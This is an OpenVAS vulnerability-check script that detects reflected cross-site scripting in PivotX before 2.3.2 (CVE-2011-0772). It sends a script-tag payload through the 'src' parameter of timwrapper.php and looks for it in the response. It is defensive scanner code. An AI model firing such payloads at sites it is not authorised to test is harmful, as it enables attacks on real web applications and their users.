##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pivotx_mult_xss_vuln.nasl 6307 2017-06-11 19:51:39Z cfischer $
#
# PivotX Multiple Cross-site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

CPE = "cpe:/a:pivotx:pivotx";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801735");
  script_version("$Revision: 6307 $");
  script_tag(name:"last_modification", value:"$Date: 2017-06-11 21:51:39 +0200 (Sun, 11 Jun 2017) $");
  script_tag(name:"creation_date", value:"2011-02-08 15:34:31 +0100 (Tue, 08 Feb 2011)");
  script_cve_id("CVE-2011-0772");
  script_bugtraq_id(45996);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("PivotX Multiple Cross-site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_pivotx_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("PivotX/Installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/43040");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64975");

  tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.

  Impact Level: Application.";

  tag_affected = "PivotX version prior to 2.3.2";

  tag_insight = "The flaws are due to input passed to the 'color' parameter in 'pivotx/includes/blogroll.php',
  'src' parameter in 'pivotx/includes/timwrapper.php' is not properly sanitised before being returned to the user.";

  tag_solution = "Upgrade to PivotX version 2.3.2 or later
  For updates refer to http://pivotx.net/";

  tag_summary = "This host is running PivotX and is prone to multiple
  Cross-site Scripting vulnerabilities.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
   
if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";
url = dir + '/pivotx/includes/timwrapper.php?src="><script>alert("OpenVAS-XSS-Testing");</script>';

if( http_vuln_check( port:port, url:url, pattern:'><script>alert("OpenVAS-XSS-Testing");</script>', check_header:TRUE ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );